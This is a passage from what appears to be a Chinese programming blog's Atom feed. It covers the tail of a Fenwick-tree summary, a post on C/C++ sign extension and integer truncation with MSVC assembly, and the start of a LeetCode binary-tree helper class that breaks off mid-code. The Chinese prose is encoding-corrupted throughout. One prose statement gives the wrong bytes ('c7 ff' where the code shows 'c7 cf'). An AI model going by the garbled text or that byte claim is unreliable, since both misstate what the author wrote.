&lt;p&gt;å‰ç¼€å’Œæ–¹æ³•åœ¨æ•°ç»„å…ƒç´ ä¸å‘ç”Ÿæ”¹å˜çš„æƒ…å†µä¸‹ååˆ†é«˜æ•ˆï¼Œä½†å¦‚æœæ•°ç»„å…ƒç´ å¯èƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¸æœ´ç´ æ±‚å’Œåšæ³•ï¼ˆä¸ä½¿ç”¨å‰ç¼€å’Œæ•°ç»„ï¼Œè€Œæ˜¯ç›´æ¥éå†åŒºé—´å…ƒç´ ç´¯è®¡æ±‚å’Œï¼‰ç›¸æ¯”ï¼Œå‰ç¼€å’Œæ•°ç»„éœ€è¦ O(n) çš„æ—¶é—´æ¥è¿›è¡Œæ›´æ–°ã€‚è¿™ä¸¤ç§åšæ³•è¦ä¹ˆæŸ¥è¯¢æ˜¯ O(1)ã€æ›´æ–°æ˜¯ O(n)ï¼Œè¦ä¹ˆæŸ¥è¯¢æ˜¯ O(n)ã€æ›´æ–°æ˜¯ O(1)ï¼Œé‚£æœ‰æ²¡æœ‰ä¸€ç§æŠ˜è¡·çš„æ–¹æ¡ˆï¼Œä½¿å¾—æŸ¥è¯¢å’Œæ›´æ–°æ•ˆç‡éƒ½ä¸è‡³äºå¤ªä½å‘¢ï¼Ÿæœ¬æ–‡å°†ä»‹ç»çš„æ ‘çŠ¶æ•°ç»„å°±ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•°æ®ç»“æ„ä¸ç®—æ³•" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="ç®—æ³•" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>ä»æœºå™¨æŒ‡ä»¤çš„è§’åº¦çœ‹ä¸€äº›ä½çº§æ“ä½œ</title>
    <link href="http://lordaeronesz.github.io/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/"/>
    <id>http://lordaeronesz.github.io/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/</id>
    <published>2024-01-06T10:59:42.000Z</published>
    <updated>2024-01-19T13:45:15.414Z</updated>
    
    <content type="html"><![CDATA[<p>C/C++ ä¸­æœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›ä½çº§æ“ä½œï¼Œé€šå¸¸æ˜¯ä¸€äº›éšå¼çš„ç±»å‹è½¬æ¢ï¼Œå®ƒä»¬å¾€å¾€å¾ˆéš¾å‡­å€Ÿé«˜çº§è¯­è¨€å±‚é¢çš„ç›´è§‰æ¥ç†è§£æˆ–è®°å¿†ã€‚æœ¬æ–‡æ—¨åœ¨åˆ†æè¿™äº›æ“ä½œå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œä»æœºå™¨æŒ‡ä»¤çš„è§’åº¦æ¥ç†è§£è¿™ç±»æ“ä½œã€‚</p><span id="more"></span><h1 id="è¡¥ç æ•°è½¬æ¢ä¸ºæ›´é•¿çš„æ— ç¬¦å·æ•°"><a href="#è¡¥ç æ•°è½¬æ¢ä¸ºæ›´é•¿çš„æ— ç¬¦å·æ•°" class="headerlink" title="è¡¥ç æ•°è½¬æ¢ä¸ºæ›´é•¿çš„æ— ç¬¦å·æ•°"></a>è¡¥ç æ•°è½¬æ¢ä¸ºæ›´é•¿çš„æ— ç¬¦å·æ•°</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -12345 4294954951</span><span class="token punctuation">&#125;</span></code></pre><p>é¦–å…ˆçœ‹ä»¥ä¸Šè¿™ä¸ªç¤ºä¾‹ï¼Œä¸€ä¸ªçŸ­æ•´å‹æ•°æ®ï¼ˆ2 å­—èŠ‚ï¼‰å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ— ç¬¦å·æ•´å‹æ•°æ®ï¼ˆ4 å­—èŠ‚ï¼‰ä¹‹åï¼Œå¾—åˆ°çš„å€¼å´æ˜¯ä¸€ä¸ªçœ‹ä¼¼æ¯«ä¸ç›¸å…³çš„ç»“æœã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> ptr<span class="token punctuation">,</span> size_t sz<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2x "</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é¦–å…ˆï¼Œä¸ºäº†æ›´å¥½åœ°åˆ†æè¿™ç±»ä½çº§æ“ä½œï¼Œè¿™é‡Œç¼–å†™äº†ä¸€ä¸ªç®€å•çš„å­—èŠ‚æ‰“å°å‡½æ•°ï¼Œé€šè¿‡å°†æŒ‡å‘å˜é‡çš„æŒ‡é’ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ä¸º <code>unsigned char *</code> ï¼Œä¾¿å¯ä»¥å¾ˆæ–¹ä¾¿åœ°é€šè¿‡å¢åŠ æ•°ç»„ä¸‹æ ‡æ¥å®ç°å¯¹æ¯ä¸ªå­—èŠ‚çš„è®¿é—®ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf</span><span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf ff ff</span><span class="token punctuation">&#125;</span></code></pre><p>é€šè¿‡æ‰“å°å˜é‡ a å’Œ b çš„ä½çº§è¡¨ç¤ºï¼Œå‘ç° a çš„ä½çº§è¡¨ç¤ºä¸ºï¼šc7 ffï¼Œè€Œ b çš„ä½çº§è¡¨ç¤ºä¸º c7 ff ff ffï¼Œè¿™è¡¨æ˜ b åœ¨ä½çº§å±‚é¢å®é™…ä¸Šè¿›è¡Œäº†ç¬¦å·æ‰©å±•ï¼ˆæ³¨æ„æ­¤å¤„å­—èŠ‚åºä¸º<strong>å°ç«¯è¡¨ç¤º</strong>ï¼Œå³å­—èŠ‚åœ°å€ç”±é«˜åˆ°ä½ä¸º ff ff ff c7ï¼‰ï¼Œå†å°†å…¶è§£é‡Šä¸ºæ— ç¬¦å·ç±»å‹ï¼Œç”¨è¡¨è¾¾å¼è¡¨ç¤ºå°±æ˜¯ï¼š<code>unsigned b = (unsigned)(int)a;</code>.</p><p>åœ¨ MSVC ç¼–è¯‘å™¨ä¸‹å¯¹å‰é¢çš„ä»£ç è¿›è¡Œç¼–è¯‘ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov eax, 0ffffcfc7hmov word ptr [a], axmovsx eax, word ptr [a]mov dword ptr [b], eax</code></pre><p>å°† a èµ‹å€¼ç»™ b çš„æŒ‡ä»¤ä¸º <code>movsx</code>ï¼Œè¯¥æŒ‡ä»¤çš„ä½œç”¨æ˜¯å°†æºæ•°æ®ç»è¿‡<strong>ç¬¦å·æ‰©å±•</strong>åå­˜å…¥ç›®çš„åœ°å€ï¼Œç›¸å…³çš„æŒ‡ä»¤è¿˜æœ‰ <code>movzx</code>ï¼Œä½œç”¨æ˜¯å°†æºæ•°æ®ç»è¿‡<strong>é›¶æ‰©å±•</strong>åå­˜å…¥ç›®çš„åœ°å€ï¼Œå› æ­¤ç¨‹åºå®é™…ä¸Šæ˜¯å°† a çš„æ¯”ç‰¹ä½ç¬¦å·æ‰©å±•åå†å­˜å…¥ b ä¸­ã€‚äº‹å®ä¸Šï¼Œè¦å¯¹ä¸€ä¸ªå˜é‡è¿›è¡Œä½•ç§æ‰©å±•ï¼Œå†³å®šå› ç´ æ˜¯<strong>æºæ•°æ®çš„ç±»å‹</strong>ï¼Œè€Œä¸ç›®æ ‡ç±»å‹æ— å…³ï¼Œè¿™æ˜¯ C è¯­è¨€æ ‡å‡†æ‰€è§„å®šçš„ã€‚</p><h1 id="æˆªæ–­è¡¥ç æ•°"><a href="#æˆªæ–­è¡¥ç æ•°" class="headerlink" title="æˆªæ–­è¡¥ç æ•°"></a>æˆªæ–­è¡¥ç æ•°</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span><span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -2147483648 0</span><span class="token punctuation">&#125;</span></code></pre><p>4 å­—èŠ‚çš„æ•´å‹è½¬æ¢ä¸º 2 å­—èŠ‚çš„çŸ­æ•´å‹ï¼ŒåŒæ ·äº§ç”Ÿäº†ä»¤äººæ„æƒ³ä¸åˆ°çš„ç»“æœã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00 00 80</span><span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00</span><span class="token punctuation">&#125;</span></code></pre><p>ç”±äºæ•´å‹çš„å­—èŠ‚é•¿åº¦å¤§äºçŸ­æ•´å‹ï¼Œå› æ­¤åœ¨ç±»å‹è½¬æ¢è¿‡ç¨‹ä¸­ï¼Œå¿…ç„¶è¦è¿›è¡Œæ•°ä½çš„æˆªæ–­ï¼Œå…³é”®åœ¨äºæˆªæ–­ç­–ç•¥çš„é€‰æ‹©ã€‚å¯¹äºæ— ç¬¦å·æ•°æ¥è¯´ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ç›´æ¥å°†é«˜ä½å­—èŠ‚éƒ¨åˆ†æˆªæ–­ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½ä¿è¯å½“æ•´å‹æ•°å€¼ a ä¸æ˜¯å¤ªå¤§ï¼ˆå°äºçŸ­æ•´å‹æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§æ•°å€¼ï¼‰æ—¶ï¼Œç±»å‹è½¬æ¢åæ•°å€¼ä¿æŒä¸å˜ã€‚è€Œæ ¹æ®ä¸Šè¿°å­—èŠ‚æ‰“å°ç»“æœï¼Œå¯ä»¥çœ‹åˆ°è¡¥ç æ•°å€¼çš„æˆªæ–­ç­–ç•¥ä¸æ— ç¬¦å·æ•°ä¸€è‡´ï¼Œä»¥ä¸‹æ±‡ç¼–ä»£ç æ¸…æ¥šåœ°è¡¨æ˜äº†è¿™ä¸€ç‚¹ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov dword ptr [a], 80000000hmov ax, word ptr [a]mov word ptr [b], ax</code></pre><p>åœ¨è¿›è¡Œç±»å‹è½¬æ¢æ—¶ï¼Œç¨‹åºåªæ˜¯ç®€å•åœ°å°†å˜é‡ a çš„ä¸€ä¸ªå­—ï¼ˆwordï¼‰ï¼Œå³ä¸¤å­—èŠ‚å­˜å…¥ b ä¸­ã€‚å› æ­¤è¡¥ç æ•°çš„æˆªæ–­ï¼Œå…¶æœ¬è´¨ä¸Šè¿˜æ˜¯ä½çº§å±‚é¢çš„æˆªæ–­ï¼Œä¸è¯¥è¡¥ç æ‰€è¡¨ç¤ºçš„æ•°å€¼å¹¶æ— å…³ç³»ï¼Œä¸æ¶‰åŠåˆ°ä»»ä½•çš„ç®—æœ¯è¿ç®—ï¼Œè¿™å°±ä½¿å¾—åœ¨å¯¹è´Ÿæ•°è¿›è¡Œæˆªæ–­æ—¶ï¼Œå¾€å¾€äº§ç”Ÿå‡ºä¹æ„æ–™çš„ç»“æœã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;C/C++ ä¸­æœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›ä½çº§æ“ä½œï¼Œé€šå¸¸æ˜¯ä¸€äº›éšå¼çš„ç±»å‹è½¬æ¢ï¼Œå®ƒä»¬å¾€å¾€å¾ˆéš¾å‡­å€Ÿé«˜çº§è¯­è¨€å±‚é¢çš„ç›´è§‰æ¥ç†è§£æˆ–è®°å¿†ã€‚æœ¬æ–‡æ—¨åœ¨åˆ†æè¿™äº›æ“ä½œå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œä»æœºå™¨æŒ‡ä»¤çš„è§’åº¦æ¥ç†è§£è¿™ç±»æ“ä½œã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="è®¡ç®—æœºä½“ç³»ç»“æ„" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="ä½è¿ç®—" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
    <category term="è®¡ç®—æœºä½“ç³»ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>é«˜æ•ˆçš„LeetCodeäºŒå‰æ ‘æœ¬åœ°IDEè°ƒè¯•æ–¹æ¡ˆ</title>
    <link href="http://lordaeronesz.github.io/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/"/>
    <id>http://lordaeronesz.github.io/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/</id>
    <published>2023-10-17T10:59:42.000Z</published>
    <updated>2023-10-19T11:41:06.193Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ LeetCode åˆ·é¢˜è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™é‡åˆ°ä¸€äº›éš¾ä»¥éš¾ä»¥ç›´æ¥è§‚å¯Ÿå‡ºæ¥çš„é”™è¯¯ï¼Œæ­¤æ—¶é€šå¸¸æƒ³è¦åˆ©ç”¨å•æ­¥è°ƒè¯•æ¥è§£å†³ï¼Œä½†å¥ˆä½•åªæœ‰ LeetCode Plus ä¼šå‘˜æ‰å¯ä»¥ä½¿ç”¨å…¶ç½‘é¡µçš„è°ƒè¯•åŠŸèƒ½ã€‚å¥½åœ¨ç»å¤§éƒ¨åˆ†æœ¬åœ° IDE éƒ½å…·å¤‡ååˆ†å¼ºå¤§çš„è°ƒè¯•åŠŸèƒ½ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è‡ªå·±çš„è§£é¢˜ä»£ç å¤åˆ¶åˆ°æœ¬åœ°ï¼Œå¹¶ç¼–å†™ç®€å•çš„æµ‹è¯•ç¨‹åºå³å¯ã€‚ä½†æ˜¯å¯¹äºäºŒå‰æ ‘ç›¸å…³çš„é¢˜ï¼Œæµ‹è¯•æ•°æ®çš„ç¼–å†™æ˜¾å¾—ä¸é‚£ä¹ˆå®¹æ˜“ï¼Œæœ¬æ–‡ç¼–å†™äº†ä¸€ä¸ªåŒ¹é… LeetCode é¢˜ç›®ä¸­çš„äºŒå‰æ ‘å®šä¹‰çš„ç±»ï¼Œè¯¥ç±»åŒ…å«ä¸€äº›åŸºæœ¬çš„é™æ€å‡½æ•°ï¼Œèƒ½å¤Ÿå¾ˆæ–¹ä¾¿åœ°å®ç°äºŒå‰æ ‘çš„æ„é€ å’ŒäºŒå‰æ ‘çš„éå†ã€‚</p><span id="more"></span><h1 id="LeetCode-äºŒå‰æ ‘çš„åºåˆ—è¡¨ç¤ºæ–¹å¼"><a href="#LeetCode-äºŒå‰æ ‘çš„åºåˆ—è¡¨ç¤ºæ–¹å¼" class="headerlink" title="LeetCode äºŒå‰æ ‘çš„åºåˆ—è¡¨ç¤ºæ–¹å¼"></a>LeetCode äºŒå‰æ ‘çš„åºåˆ—è¡¨ç¤ºæ–¹å¼</h1><p>LeetCode ä¸­é’ˆå¯¹äºŒå‰æ ‘çš„è¾“å…¥æ•°æ®ä»¥ä¸€ä¸ª<strong>å±‚åºéå†</strong>åºåˆ—çš„å½¢å¼ç»™å‡ºã€‚ä¸é€šå¸¸æˆ‘ä»¬æ‰€è¯´çš„å±‚åºåºåˆ—ä¸åŒçš„æ˜¯ï¼Œè¯¥å±‚åºåºåˆ—åŒ…å«ä»æ ¹èŠ‚ç‚¹åˆ°æœ€åä¸€ä¸ªéç©ºç»“ç‚¹ä¹‹é—´çš„æ‰€æœ‰ç©ºç»“ç‚¹ï¼Œè¯¥ç©ºç»“ç‚¹ä»¥ <strong>null</strong> çš„æ ‡è¯†ç¬¦ç»™å‡ºï¼Œä»¥æ­¤ä¿è¯æ ¹æ®æ­¤åºåˆ—æ‰€æ„é€ äºŒå‰æ ‘çš„å”¯ä¸€æ€§ï¼ˆå•çº¯ä¾é å¸¸è§„çš„ä¸å«ç©ºç»“ç‚¹çš„å±‚åºåºåˆ—æ— æ³•æ„é€ ä¸€æ£µå”¯ä¸€çš„äºŒå‰æ ‘ï¼‰ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><p><strong>è¾“å…¥ï¼š</strong> <code>root = [3, 9, 20, null, null, 15, 7]</code></p><p><img src="/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/tree1.jpg"></p><h1 id="å¸¦æ„é€ ä¸éå†çš„äºŒå‰æ ‘ç±»"><a href="#å¸¦æ„é€ ä¸éå†çš„äºŒå‰æ ‘ç±»" class="headerlink" title="å¸¦æ„é€ ä¸éå†çš„äºŒå‰æ ‘ç±»"></a>å¸¦æ„é€ ä¸éå†çš„äºŒå‰æ ‘ç±»</h1><p>ä¸ºäº†æ–¹ä¾¿èƒ½åœ¨æœ¬åœ° IDE ä¸­ç›´æ¥æ ¹æ®è¾“å…¥æ•°æ®çš„æ ¼å¼æ„é€ äºŒå‰æ ‘ï¼Œæœ¬æ–‡ç¼–å†™äº†ä¸¤ä¸ªç®€å•çš„é™æ€æ–¹æ³•ï¼Œæ¥æ–¹ä¾¿æ•°æ®çš„è¾“å…¥ä¸è¾“å‡ºã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">null</span> <span class="token expression">INT32_MAX</span></span><span class="token keyword">struct</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> val<span class="token punctuation">;</span>TreeNode<span class="token operator">*</span> left<span class="token punctuation">,</span> <span class="token operator">*</span> right<span class="token punctuation">;</span><span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// å¸¦ç©ºç»“ç‚¹çš„å±‚åºéå†</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> buf<span class="token punctuation">;</span> <span class="token comment">// è¾“å‡ºç¼“å†²</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token function">to_string</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"null"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å»é™¤æœ«å°¾å¤šä½™çš„ç©ºç»“ç‚¹</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> val <span class="token operator">:</span> buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// æ ¹æ®å±‚åºåºåˆ—åˆ›å»ºäºŒå‰æ ‘</span><span class="token keyword">static</span> TreeNode<span class="token operator">*</span> <span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> order<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> order<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span><span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// æŒ‡å‘å½“å‰ç»“ç‚¹çš„å­ç»“ç‚¹</span>TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> lChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span><span class="token 